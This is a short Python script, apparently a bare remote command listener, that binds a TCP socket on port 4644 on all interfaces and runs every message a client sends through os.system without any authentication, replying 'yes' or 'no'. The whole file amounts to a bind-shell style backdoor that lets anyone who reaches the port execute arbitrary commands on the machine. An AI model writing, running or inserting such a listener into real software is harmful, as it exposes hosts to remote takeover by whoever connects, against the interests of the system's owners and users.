import socket
s = socket.socket()
server_address = ('', 4644)
s.bind(server_address)
import os
s.listen(1)
while True:
    c, addr = s.accept()
    print("Connection established with:",addr)
    msg = c.recv(1024).decode('utf-8')
    try:
        os.system(msg)
        c.send("yes".encode('utf-8'))
    except:
        c.send("no".encode('utf-8'))